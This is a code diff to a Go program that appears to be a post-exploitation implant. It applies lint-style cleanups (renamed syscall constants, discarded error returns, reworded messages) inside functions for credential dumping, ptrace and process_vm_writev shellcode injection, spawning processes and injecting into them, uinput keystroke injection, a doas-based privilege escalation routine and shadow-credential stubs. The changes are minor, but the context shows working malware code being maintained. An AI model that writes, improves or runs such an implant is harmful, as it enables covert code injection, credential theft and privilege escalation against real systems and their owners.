@@ -757,8 +757,8 @@ func dumpCreds() (string, error) {
 // ── Linux Process Injection ──────────────────────────────────────────────
 
 const (
-	SYS_PROCESS_VM_READV  = 310
-	SYS_PROCESS_VM_WRITEV = 311
+	sysProcessVMReadV  = 310
+	sysProcessVMWriteV = 311
 )
 
 type iovec struct {
@@ -785,7 +785,9 @@ func injectPtrace(pid int, shellcode []byte) error {
 	if err != nil {
 		return fmt.Errorf("ptrace attach failed: %w", err)
 	}
-	defer syscall.PtraceDetach(pid)
+	// Detach on every return path is best-effort: a failed detach only
+	// leaves the tracee traced until it exits.
+	defer func() { _ = syscall.PtraceDetach(pid) }()
 
 	// Wait for the process to stop
 	var ws syscall.WaitStatus
@@ -949,7 +951,7 @@ func injectProcessVMWriteV(pid int, shellcode []byte) error {
 	}
 
 	ret, _, errno := syscall.Syscall6(
-		SYS_PROCESS_VM_WRITEV,
+		sysProcessVMWriteV,
 		uintptr(pid),
 		uintptr(unsafe.Pointer(&localIov)),
 		1,
@@ -1106,19 +1108,20 @@ func spawnProcess(targetExe string, shellcode []byte, technique string) string {
 	var ws syscall.WaitStatus
 	_, err := syscall.Wait4(pid, &ws, 0, nil)
 	if err != nil {
-		cmd.Process.Kill()
+		_ = cmd.Process.Kill()
 		return fmt.Sprintf("spawnProcess: wait4 failed: %v", err)
 	}
 
 	// Now inject the shellcode via ptrace
 	err = injectPtrace(pid, shellcode)
 	if err != nil {
-		cmd.Process.Kill()
+		_ = cmd.Process.Kill()
 		return fmt.Sprintf("spawnProcess: ptrace injection failed: %v", err)
 	}
 
 	// Detach and let the process run
-	syscall.PtraceDetach(pid)
+	// Same best-effort detach rationale as above.
+	_ = syscall.PtraceDetach(pid)
 
 	return fmt.Sprintf("spawnProcess: injected %d bytes into %s (pid=%d) via %s", len(shellcode), targetExe, pid, technique)
 }
@@ -1511,7 +1514,7 @@ func remoteInputDispatch(payload string) (string, error) {
 		uinputDevices := []string{"/dev/uinput", "/dev/input/uinput"}
 		for _, dev := range uinputDevices {
 			if f, err := os.OpenFile(dev, os.O_WRONLY, 0); err == nil {
-				f.Write([]byte(payload))
+				_, _ = f.Write([]byte(payload))
 				f.Close()
 				return fmt.Sprintf("remote_input: sent via %s: %s", dev, payload), nil
 			}
@@ -1791,7 +1794,7 @@ func uacBypass(method, payload string) (string, error) {
 		if out, err := runShell(fmt.Sprintf("doas %s 2>&1", payload), ""); err == nil {
 			sb.WriteString(fmt.Sprintf("[+] SUCCESS\n%s\n", out))
 		} else {
-			sb.WriteString(fmt.Sprintf("[-] doas not available or failed\n"))
+			sb.WriteString("[-] doas not available or failed\n")
 		}
 		return sb.String(), nil
 
@@ -1954,7 +1957,7 @@ func adcsRequest(template string) (string, error) {
 	return "", fmt.Errorf("AD CS certificate request is Windows-only")
 }
 func shadowCreds(target string) (string, error) {
-	return "", fmt.Errorf("Shadow Credentials is Windows-only")
+	return "", fmt.Errorf("shadow credentials are Windows-only")
 }
 func ldapQuery(filter string) (string, error) {
 	return "", fmt.Errorf("LDAP queries are Windows-only")
